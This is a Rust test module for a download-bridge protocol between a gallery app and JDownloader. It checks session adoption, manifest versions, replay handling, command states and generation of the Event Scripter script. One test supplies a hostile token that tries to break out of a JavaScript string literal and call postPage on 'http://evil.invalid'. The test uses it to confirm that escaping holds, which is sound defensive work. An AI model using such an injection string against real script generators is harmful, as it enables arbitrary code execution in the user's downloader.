                    work_id: f.work_id.clone(),
                    post_id: f.post_id,
                    manifest_version: f.manifest_version,
                    expected: Vec::new(),
                    links: Vec::new(),
                    password: None,
                    state: BRIDGE_COMMAND_ISSUED.to_string(),
                }
            },
            vec![finished("1", "a.zip", "/tmp/whatever.zip")],
            true,
        );
        p.expected = vec!["1".to_string()];
        let resp =
            process_bridge_exchange(&f.conn, &f.payload("sess-1", 2, vec![p]), &f.roots).unwrap();
        assert_eq!(resp.settled_receipts, 0);
        assert_eq!(resp.rejected, 1);
    }

    #[test]
    fn a_report_from_another_bridge_is_refused() {
        let f = fixture("fanbox", "artist_foreign", "post_jd_foreign");
        f.handshake("sess-1");
        let task = f.task("sess-1");
        let a = f.write_output("a.zip", b"payload a");

        let mut payload = f.payload(
            "sess-1",
            2,
            vec![page(&task, vec![finished("link-a", "a.zip", &a)], true)],
        );
        payload.bridge_id = "jd-other".to_string();
        let resp = process_bridge_exchange(&f.conn, &payload, &f.roots).unwrap();
        assert_eq!(resp.settled_receipts, 0);
        assert_eq!(resp.rejected, 1);
    }

    #[test]
    fn a_report_from_an_unadopted_session_is_refused() {
        let f = fixture("fanbox", "artist_session", "post_jd_session");
        f.handshake("sess-1");
        let task = f.task("sess-1");
        let a = f.write_output("a.zip", b"payload a");

        // A different session that never handshook cannot settle this task.
        let mut payload = f.payload(
            "sess-1",
            2,
            vec![page(&task, vec![finished("link-a", "a.zip", &a)], true)],
        );
        payload.session_id = "sess-2".to_string();
        payload.capabilities = None;
        let resp = process_bridge_exchange(&f.conn, &payload, &f.roots).unwrap();
        assert_eq!(resp.settled_receipts, 0);
        assert_eq!(resp.rejected, 1);

        // A handshake from the restarted run adopts the issued task, and the
        // same snapshot then settles under the new session.
        f.handshake("sess-2");
        let adopted = load_bridge_task(&f.conn, &task.task_id).unwrap().unwrap();
        assert_eq!(adopted.session_id, "sess-2");
        let payload = f.payload(
            "sess-2",
            3,
            vec![page(&task, vec![finished("link-a", "a.zip", &a)], true)],
        );
        let resp = process_bridge_exchange(&f.conn, &payload, &f.roots).unwrap();
        assert_eq!(resp.settled_receipts, 1);
    }

    #[test]
    fn a_stale_frozen_version_is_history_not_a_settlement() {
        let f = fixture("fanbox", "artist_stale", "post_jd_stale");
        f.handshake("sess-1");
        let task = f.task("sess-1");
        let a = f.write_output("a.zip", b"payload a");

        // The post moves to a newer manifest before the delivery is reported.
        f.conn
            .execute(
                "UPDATE kemono_posts SET manifest_version = manifest_version + 1 WHERE id = ?1",
                params![f.post_id],
            )
            .unwrap();

        let resp = process_bridge_exchange(
            &f.conn,
            &f.payload(
                "sess-1",
                2,
                vec![page(&task, vec![finished("link-a", "a.zip", &a)], true)],
            ),
            &f.roots,
        )
        .unwrap();
        assert_eq!(resp.settled_receipts, 0);
        assert_eq!(resp.rejected, 1);
    }

    #[test]
    fn a_future_manifest_version_in_the_report_is_refused() {
        let f = fixture("fanbox", "artist_future", "post_jd_future");
        f.handshake("sess-1");
        let task = f.task("sess-1");
        let a = f.write_output("a.zip", b"payload a");

        let mut p = page(&task, vec![finished("link-a", "a.zip", &a)], true);
        p.manifest_version = task.manifest_version + 7;
        let resp =
            process_bridge_exchange(&f.conn, &f.payload("sess-1", 2, vec![p]), &f.roots).unwrap();
        assert_eq!(resp.settled_receipts, 0);
        assert_eq!(resp.rejected, 1);
    }

    #[test]
    fn a_changed_identity_set_is_refused() {
        let f = fixture("fanbox", "artist_changed", "post_jd_changed");
        f.handshake("sess-1");
        let task = f.task("sess-1");
        let a = f.write_output("a.zip", b"payload a");

        let first = page(&task, vec![finished("link-a", "a.zip", &a)], true);
        process_bridge_exchange(&f.conn, &f.payload("sess-1", 2, vec![first]), &f.roots).unwrap();

        let mut second = page(&task, vec![finished("link-a", "a.zip", &a)], true);
        second.snapshot_id = "snap-2".to_string();
        second.expected = vec!["link-a".to_string(), "link-b".to_string()];
        let resp =
            process_bridge_exchange(&f.conn, &f.payload("sess-1", 3, vec![second]), &f.roots)
                .unwrap();
        assert_eq!(resp.settled_receipts, 0);
        assert_eq!(resp.rejected, 1);
    }

    #[test]
    fn an_extraction_that_has_not_finished_blocks_the_import() {
        let f = fixture("fanbox", "artist_extract", "post_jd_extract");
        f.handshake("sess-1");
        let task = f.task("sess-1");
        let a = f.write_output("a.zip", b"payload a");

        let mut record = finished("link-a", "a.zip", &a);
        record.extraction_status = "RUNNING".to_string();
        let resp = process_bridge_exchange(
            &f.conn,
            &f.payload("sess-1", 2, vec![page(&task, vec![record], true)]),
            &f.roots,
        )
        .unwrap();
        assert_eq!(resp.settled_receipts, 0);
        assert_eq!(resp.rejected, 1);
    }

    #[test]
    fn netdisk_successful_extraction_settles_the_verified_archive_only() {
        let f = fixture("fanbox", "artist_extract_done", "post_extract_done");
        f.handshake("sess-1");
        let task = f.task("sess-1");
        let archive = f.write_output("bundle.rar", b"original archive");
        let mut record = finished("link-a", "bundle.rar", &archive);
        record.extraction_status = "SUCCESSFUL".into();
        let response = process_bridge_exchange(
            &f.conn,
            &f.payload("sess-1", 2, vec![page(&task, vec![record], true)]),
            &f.roots,
        )
        .unwrap();
        assert_eq!(response.settled_receipts, 1);
        let paths: String = f.conn.query_row("SELECT output_paths FROM pawchive_external_receipts WHERE task_id=?1 AND settled=1",
            [&task.task_id], |r| r.get(0)).unwrap();
        assert_eq!(Path::new(paths.trim()), Path::new(&archive));
        for state in ["RUNNING", "QUEUED", "ERROR", "FAILED", "UNKNOWN"] {
            let record = BridgeLinkStatus {
                extraction_status: state.into(),
                ..Default::default()
            };
            assert!(record.extraction_blocks_import());
        }
    }

    #[test]
    fn a_mirror_finish_is_reported_but_never_settles() {
        let f = fixture("fanbox", "artist_mirror", "post_jd_mirror");
        f.handshake("sess-1");
        let task = f.task("sess-1");
        let a = f.write_output("a.zip", b"payload a");

        let mut record = finished("link-a", "a.zip", &a);
        record.status = "FINISHED_MIRROR".to_string();
        let resp = process_bridge_exchange(
            &f.conn,
            &f.payload("sess-1", 2, vec![page(&task, vec![record], true)]),
            &f.roots,
        )
        .unwrap();
        assert_eq!(resp.settled_receipts, 0);
        assert_eq!(resp.rejected, 1);
    }

    #[test]
    fn an_output_outside_the_media_roots_never_settles() {
        let f = fixture("fanbox", "artist_outside", "post_jd_outside");
        f.handshake("sess-1");
        let task = f.task("sess-1");
        let outside = tempfile::tempdir().unwrap();
        let path = outside.path().join("outside.zip");
        std::fs::write(&path, b"outside payload").unwrap();

        let resp = process_bridge_exchange(
            &f.conn,
            &f.payload(
                "sess-1",
                2,
                vec![page(
                    &task,
                    vec![finished("link-a", "outside.zip", &path.to_string_lossy())],
                    true,
                )],
            ),
            &f.roots,
        )
        .unwrap();
        assert_eq!(resp.settled_receipts, 0);
        assert_eq!(resp.rejected, 1);
    }

    #[test]
    fn an_unusable_identity_is_refused_rather_than_dropped() {
        let f = fixture("fanbox", "artist_unsafe", "post_jd_unsafe");
        f.handshake("sess-1");
        let task = f.task("sess-1");
        let a = f.write_output("a.zip", b"payload a");

        let mut record = finished("9007199254740992", "a.zip", &a);
        record.unsafe_id = true;
        let mut p = page(&task, vec![record], true);
        p.expected = vec!["9007199254740992".to_string()];
        let resp =
            process_bridge_exchange(&f.conn, &f.payload("sess-1", 2, vec![p]), &f.roots).unwrap();
        assert_eq!(resp.settled_receipts, 0);
        assert_eq!(resp.rejected, 1);
    }

    #[test]
    fn an_old_page_cannot_un_finish_a_link() {
        let f = fixture("fanbox", "artist_order", "post_jd_order");
        f.handshake("sess-1");
        let task = f.task("sess-1");
        let a = f.write_output("a.zip", b"payload a");

        let done = page(&task, vec![finished("link-a", "a.zip", &a)], true);
        process_bridge_exchange(&f.conn, &f.payload("sess-1", 2, vec![done]), &f.roots).unwrap();

        // A re-sent page that still shows the link as running must not undo it.
        let mut running = finished("link-a", "a.zip", &a);
        running.finished = false;
        running.running = true;
        running.status = "RUNNING".to_string();
        let mut stale = page(&task, vec![running], false);
        stale.page_index = 0;
        process_bridge_exchange(&f.conn, &f.payload("sess-1", 3, vec![stale]), &f.roots).unwrap();

        let stored: String = f
            .conn
            .query_row(
                "SELECT records FROM netdisk_bridge_snapshots WHERE task_id = ?1",
                params![task.task_id],
                |row| row.get(0),
            )
            .unwrap();
        let records: Vec<BridgeLinkStatus> = serde_json::from_str(&stored).unwrap();
        assert!(records[0].finished, "a terminal observation is sticky");
    }

    #[test]
    fn pages_arriving_out_of_order_still_form_one_snapshot() {
        let f = fixture("fanbox", "artist_pages", "post_jd_pages");
        f.handshake("sess-1");
        let task = f.task("sess-1");
        let a = f.write_output("a.zip", b"payload a");
        let b = f.write_output("b.zip", b"payload b");

        // Page 1 first, then page 0. Neither is complete on its own.
        let mut second = page(&task, vec![finished("link-b", "b.zip", &b)], false);
        second.page_index = 1;
        second.total_count = 2;
        second.expected = Vec::new();
        let resp =
            process_bridge_exchange(&f.conn, &f.payload("sess-1", 2, vec![second]), &f.roots)
                .unwrap();
        assert_eq!(resp.settled_receipts, 0);

        let mut first = page(&task, vec![finished("link-a", "a.zip", &a)], true);
        first.page_index = 0;
        first.total_count = 2;
        first.expected = vec!["link-a".to_string(), "link-b".to_string()];
        let resp = process_bridge_exchange(&f.conn, &f.payload("sess-1", 3, vec![first]), &f.roots)
            .unwrap();
        assert_eq!(resp.settled_receipts, 1, "both pages complete the snapshot");
    }

    #[test]
    fn netdisk_last_page_without_repeated_expectations_settles_verified_outputs() {
        let f = fixture("fanbox", "paged", "bundle");
        f.handshake("sess-1");
        let task = f.task("sess-1");
        let a = f.write_output("a.rar", b"abc");
        let b = f.write_output("b.rar", b"def");
        let mut first = page(&task, vec![finished("a", "a.rar", &a)], false);
        first.expected = vec!["a".into(), "b".into()];
        first.total_count = 2;
        assert_eq!(
            process_bridge_exchange(&f.conn, &f.payload("sess-1", 2, vec![first]), &f.roots)
                .unwrap()
                .settled_receipts,
            0
        );
        let mut record = finished("b", "b.rar", &b);
        record.status = "FINISHED_SHA256".into();
        record.bytes_total = 999;
        record.bytes_total_verified = 3;
        let mut last = page(&task, vec![record.clone()], true);
        last.page_index = 1;
        last.total_count = 2;
        last.expected.clear();
        assert_eq!(
            process_bridge_exchange(&f.conn, &f.payload("sess-1", 3, vec![last]), &f.roots)
                .unwrap()
                .settled_receipts,
            1
        );
        record.status = "FINISHED_MIRROR".into();
        assert!(!record.is_completed());
    }

    #[test]
    fn netdisk_verified_length_mismatch_never_settles() {
        let f = fixture("fanbox", "length", "bundle");
        f.handshake("sess-1");
        let task = f.task("sess-1");
        let path = f.write_output("a.rar", b"abc");
        let mut record = finished("a", "a.rar", &path);
        record.bytes_total_verified = 4;
        assert_eq!(
            process_bridge_exchange(
                &f.conn,
                &f.payload("sess-1", 2, vec![page(&task, vec![record], true)]),
                &f.roots
            )
            .unwrap()
            .settled_receipts,
            0
        );
    }

    #[test]
    fn netdisk_start_directives_exclude_unsubmitted_paused_and_foreign_tasks() {
        let f = fixture("fanbox", "directives", "bundle");
        f.handshake("sess-1");
        let task = f.task("sess-1");
        f.conn
            .execute(
                "INSERT INTO app_settings(key,value) VALUES('netdisk_enabled','1')",
                [],
            )
            .unwrap();
        assert!(start_directives(&f.conn, "jd-local").unwrap().is_empty());
        submit_bridge_task(&f.conn, &task, "/staging").unwrap();
        assert_eq!(start_directives(&f.conn, "jd-local").unwrap().len(), 1);
        assert!(start_directives(&f.conn, "another").unwrap().is_empty());
        queue_bridge_command(
            &f.conn,
            "jd-local",
            &task.task_id,
            "pause",
            &serde_json::json!({}),
        )
        .unwrap();
        assert!(start_directives(&f.conn, "jd-local").unwrap().is_empty());
    }

    #[test]
    fn a_lost_reply_is_replayed_instead_of_re_executed() {
        let f = fixture("fanbox", "artist_replay", "post_jd_replay");
        f.handshake("sess-1");
        queue_bridge_command(
            &f.conn,
            "jd-local",
            "task-1",
            "pause",
            &serde_json::json!({"link_ids": ["1"]}),
        )
        .unwrap();

        let payload = f.payload("sess-1", 2, Vec::new());
        let first = process_bridge_exchange(&f.conn, &payload, &f.roots).unwrap();
        assert_eq!(first.commands.len(), 1);
        assert!(!first.replayed);

        // The reply never reached JD, so JD asks again with the same sequence.
        let second = process_bridge_exchange(&f.conn, &payload, &f.roots).unwrap();
        assert!(second.replayed, "the stored answer is replayed verbatim");
        assert_eq!(second.commands.len(), 1);
        assert_eq!(second.commands[0].command_id, first.commands[0].command_id);
    }

    #[test]
    fn a_reused_sequence_with_different_content_is_a_conflict() {
        let f = fixture("fanbox", "artist_conflict", "post_jd_conflict");
        f.handshake("sess-1");
        let payload = f.payload("sess-1", 2, Vec::new());
        process_bridge_exchange(&f.conn, &payload, &f.roots).unwrap();

        let mut different = f.payload("sess-1", 2, Vec::new());
        different.ack = 99;
        let error = process_bridge_exchange(&f.conn, &different, &f.roots).unwrap_err();
        assert!(
            error.downcast_ref::<BridgeConflict>().is_some(),
            "a reused sequence with different content is a conflict"
        );
    }

    #[test]
    fn a_transport_ack_alone_never_completes_a_command() {
        let f = fixture("fanbox", "artist_transport", "post_jd_transport");
        f.handshake("sess-1");
        let command_id = queue_bridge_command(
            &f.conn,
            "jd-local",
            "task-1",
            "pause",
            &serde_json::json!({}),
        )
        .unwrap();
        let mut payload = f.payload("sess-1", 2, Vec::new());
        payload.ack = 2;
        process_bridge_exchange(&f.conn, &payload, &f.roots).unwrap();

        let status: String = f
            .conn
            .query_row(
                "SELECT status FROM netdisk_bridge_commands WHERE command_id = ?1",
                params![command_id],
                |row| row.get(0),
            )
            .unwrap();
        assert_eq!(status, BRIDGE_COMMAND_ISSUED);

        let mut ack = f.payload("sess-1", 3, Vec::new());
        ack.command_acks = vec![command_id.clone()];
        process_bridge_exchange(&f.conn, &ack, &f.roots).unwrap();
        let status: String = f
            .conn
            .query_row(
                "SELECT status FROM netdisk_bridge_commands WHERE command_id = ?1",
                params![command_id],
                |row| row.get(0),
            )
            .unwrap();
        assert_eq!(status, BRIDGE_COMMAND_CONFIRMED);
    }

    #[test]
    fn a_retransmitted_side_effect_command_becomes_uncertain() {
        let f = fixture("fanbox", "artist_uncertain", "post_jd_uncertain");
        f.handshake("sess-1");
        let command_id = queue_bridge_command(
            &f.conn,
            "jd-local",
            "task-1",
            "add_links",
            &serde_json::json!({"urls": "https://example.invalid/x"}),
        )
        .unwrap();

        let first = process_bridge_exchange(&f.conn, &f.payload("sess-1", 2, Vec::new()), &f.roots)
            .unwrap();
        assert_eq!(first.commands.len(), 1);
        let status: String = f
            .conn
            .query_row(
                "SELECT status FROM netdisk_bridge_commands WHERE command_id = ?1",
                params![command_id],
                |row| row.get(0),
            )
            .unwrap();
        assert_eq!(status, BRIDGE_COMMAND_ISSUED);

        // Re-sent because no result arrived: Gallery stops claiming to know.
        let second =
            process_bridge_exchange(&f.conn, &f.payload("sess-1", 3, Vec::new()), &f.roots)
                .unwrap();
        assert_eq!(
            second.commands.len(),
            1,
            "the bridge can still de-duplicate it"
        );
        let status: String = f
            .conn
            .query_row(
                "SELECT status FROM netdisk_bridge_commands WHERE command_id = ?1",
                params![command_id],
                |row| row.get(0),
            )
            .unwrap();
        assert_eq!(status, BRIDGE_COMMAND_UNCERTAIN);

        // A heartbeat does not clear the uncertainty.
        process_bridge_exchange(&f.conn, &f.payload("sess-1", 4, Vec::new()), &f.roots).unwrap();
        let status: String = f
            .conn
            .query_row(
                "SELECT status FROM netdisk_bridge_commands WHERE command_id = ?1",
                params![command_id],
                |row| row.get(0),
            )
            .unwrap();
        assert_eq!(status, BRIDGE_COMMAND_UNCERTAIN);

        // Only a reported outcome does.
        let mut done = f.payload("sess-1", 5, Vec::new());
        done.command_results = vec![BridgeCommandResult {
            command_id: command_id.clone(),
            ok: true,
            detail: "12345".to_string(),
        }];
        process_bridge_exchange(&f.conn, &done, &f.roots).unwrap();
        let status: String = f
            .conn
            .query_row(
                "SELECT status FROM netdisk_bridge_commands WHERE command_id = ?1",
                params![command_id],
                |row| row.get(0),
            )
            .unwrap();
        assert_eq!(status, BRIDGE_COMMAND_CONFIRMED);
    }

    #[test]
    fn an_untrusted_handshake_cannot_settle_anything() {
        let f = fixture("fanbox", "artist_caps", "post_jd_caps");
        let mut handshake = f.payload("sess-1", 1, Vec::new());
        handshake.capabilities = Some(BridgeCapabilities {
            protocol_version: "1".to_string(),
            supports_commands: false,
            ..Default::default()
        });
        process_bridge_exchange(&f.conn, &handshake, &f.roots).unwrap();
        let task = f.task("sess-1");
        let a = f.write_output("a.zip", b"payload a");

        let mut report = f.payload(
            "sess-1",
            2,
            vec![page(&task, vec![finished("link-a", "a.zip", &a)], true)],
        );
        report.capabilities = None;
        let resp = process_bridge_exchange(&f.conn, &report, &f.roots).unwrap();
        assert_eq!(resp.settled_receipts, 0);
        assert_eq!(resp.rejected, 1);
    }

    #[test]
    fn a_missing_session_is_rejected_as_input() {
        let f = fixture("fanbox", "artist_nosession", "post_jd_nosession");
        let mut payload = f.payload("", 1, Vec::new());
        payload.session_id = String::new();
        let error = process_bridge_exchange(&f.conn, &payload, &f.roots).unwrap_err();
        assert!(error.downcast_ref::<BridgeInvalid>().is_some());
    }

    #[test]
    fn an_old_command_state_name_is_migrated_once() {
        let conn = test_conn();
        conn.execute(
            "INSERT INTO netdisk_bridge_commands
                 (command_id, bridge_id, job_id, action, params, status, created_at)
             VALUES ('cmd_legacy', 'jd-local', 't', 'pause', '{}', 'dispatched', 1.0)",
            [],
        )
        .unwrap();
        ensure_netdisk_bridge_schema(&conn).unwrap();
        let status: String = conn
            .query_row(
                "SELECT status FROM netdisk_bridge_commands WHERE command_id = 'cmd_legacy'",
                [],
                |row| row.get(0),
            )
            .unwrap();
        assert_eq!(status, BRIDGE_COMMAND_ISSUED);

        // A second pass on an unchanged database writes nothing.
        let before = conn.total_changes();
        ensure_netdisk_bridge_schema(&conn).unwrap();
        assert_eq!(conn.total_changes(), before);
    }

    #[test]
    fn same_service_different_creators_do_not_cross_settle() {
        let a = fixture("fanbox", "artist_one", "shared_post_id");
        a.handshake("sess-a");
        let task_a = a.task("sess-a");

        let b = fixture("fanbox", "artist_two", "shared_post_id");
        b.handshake("sess-a");
        let task_b = b.task("sess-a");
        assert_ne!(task_a.task_id, task_b.task_id);

        // The two bridges are separate, so a report about b's task cannot touch
        // a's work.
        let file_a = a.write_output("a.zip", b"payload a");
        let file_b = b.write_output("b.zip", b"payload b");
        process_bridge_exchange(
            &a.conn,
            &a.payload(
                "sess-a",
                2,
                vec![page(
                    &task_a,
                    vec![finished("link-a", "a.zip", &file_a)],
                    true,
                )],
            ),
            &a.roots,
        )
        .unwrap();
        let resp = process_bridge_exchange(
            &b.conn,
            &b.payload(
                "sess-a",
                2,
                vec![page(
                    &task_b,
                    vec![finished("link-b", "b.zip", &file_b)],
                    true,
                )],
            ),
            &b.roots,
        )
        .unwrap();
        assert_eq!(resp.settled_receipts, 1);

        let events_a: i64 = a
            .conn
            .query_row(
                "SELECT COUNT(*) FROM pawchive_acquisition_events WHERE work_id = ?1",
                params![a.work_id],
                |row| row.get(0),
            )
            .unwrap();
        let events_b: i64 = b
            .conn
            .query_row(
                "SELECT COUNT(*) FROM pawchive_acquisition_events WHERE work_id = ?1",
                params![b.work_id],
                |row| row.get(0),
            )
            .unwrap();
        assert_eq!(events_a, 1);
        assert_eq!(events_b, 1);
        assert_ne!(a.work_id, b.work_id);
    }

    /// The JavaScript suite under `tests/frontend/` executes this exact
    /// generator output, so the two sides have to agree on the substitution
    /// rules. If a placeholder is renamed or a fifth one is added, this fails
    /// before the JS suite can silently run a template nobody ships.
    #[test]
    fn generated_script_matches_the_documented_substitutions() {
        let script = generate_event_scripter_script("tok-abc123", "http://127.0.0.1:8899");

        assert!(
            !script.contains("__GALLERY_BRIDGE_"),
            "no placeholder survives"
        );
        assert!(script.contains(r#"var GALLERY_TOKEN = "tok-abc123";"#));
        assert!(script
            .contains(r#"var GALLERY_URL = "http://127.0.0.1:8899/api/netdisk/bridge/exchange";"#));
        assert!(script.contains(r#"var GALLERY_PROTOCOL = "2";"#));
        assert!(script.contains(&format!(
            "var GALLERY_SCRIPT_VERSION = \"{NETDISK_SCRIPT_VERSION}\";"
        )));

        // A trailing slash on the base URL must not produce a doubled path.
        let trimmed = generate_event_scripter_script("t", "http://host:1/");
        assert!(
            trimmed.contains(r#"var GALLERY_URL = "http://host:1/api/netdisk/bridge/exchange";"#)
        );
    }

    /// A token is attacker-influenced in the sense that it is generated and
    /// pasted, so a quote in it must not end the literal. The template is the
    /// only thing between that string and arbitrary code in JDownloader.
    #[test]
    fn a_hostile_token_cannot_end_the_literal() {
        let script = generate_event_scripter_script(
            "a\"; postPage(\"http://evil.invalid\", \"x\"); var y = \"",
            "http://127.0.0.1:8899",
        );
        assert!(!script.contains("postPage(\"http://evil.invalid\""));
        assert!(script.contains(
            r#"var GALLERY_TOKEN = "a\"; postPage(\"http://evil.invalid\", \"x\"); var y = \"";"#
        ));
        // Exactly the one call the script is supposed to make is left in the
        // body: the token did not introduce a second one.
        assert_eq!(script.matches("postPage(GALLERY_URL").count(), 2);
    }

    /// The script body is a real file, not a string built in Rust, so this
    /// pins that the shipped template is the one the tests exercise.
    #[test]
    fn the_shipped_template_is_es5_and_prefix_scoped() {
        assert!(SCRIPT_TEMPLATE.contains(r#"var GALLERY_PACKAGE_PREFIX = "gallery-";"#));
        assert!(SCRIPT_TEMPLATE.contains("function loadState()"));
        assert!(SCRIPT_TEMPLATE.contains("setProp(cursorName"));

        // No ES6 syntax: the Event Scripter engine is not a browser. Comments
        // are stripped first, because the header explains this rule using the
        // very tokens it bans.
        let code: String = SCRIPT_TEMPLATE
            .lines()
            .map(|line| match line.find("//") {
                Some(index) => &line[..index],
                None => line,
            })
            .collect::<Vec<_>>()
            .join("\n");
        for banned in ["=>", "const ", "let ", "`", "..."] {
            assert!(
                !code.contains(banned),
                "template must stay ES5, found {banned}"
            );
        }
    }

    /// §6.6: the script reports JD's global auto-start on every handshake, and
    /// only a reported `false` authorises a move. "Could not read" is a
    /// different answer from "off", and only one of them is safe.
    #[test]
    fn only_a_reported_off_global_autostart_authorises_a_move() {
        let mut capabilities = BridgeCapabilities {
            script_version: NETDISK_SCRIPT_VERSION.to_string(),
            protocol_version: NETDISK_PROTOCOL_VERSION.to_string(),
            supports_commands: true,
            supports_pagination: true,
            supports_download_path: true,
            supports_snapshot: true,
            max_page_size: 100,
            linkgrabber_auto_start_enabled: None,
        };

        // Unknown is not off.
        assert!(!capabilities.move_is_isolated());
        assert!(capabilities.is_trusted(), "the bridge is still trusted");

        capabilities.linkgrabber_auto_start_enabled = Some(true);
        assert!(
            !capabilities.move_is_isolated(),
            "an on setting is exactly what the pre-check exists to catch"
        );

        capabilities.linkgrabber_auto_start_enabled = Some(false);
        assert!(capabilities.move_is_isolated());

        // The script has to send it, or Gallery can never verify anything.
        assert!(SCRIPT_TEMPLATE.contains("linkgrabber_auto_start_enabled: globalAutoStart()"));
        assert!(SCRIPT_TEMPLATE.contains("function globalAutoStart()"));
        // It reports; it never writes the setting.
        assert!(!SCRIPT_TEMPLATE.contains(r#"callAPI("config", "set""#));
    }
}
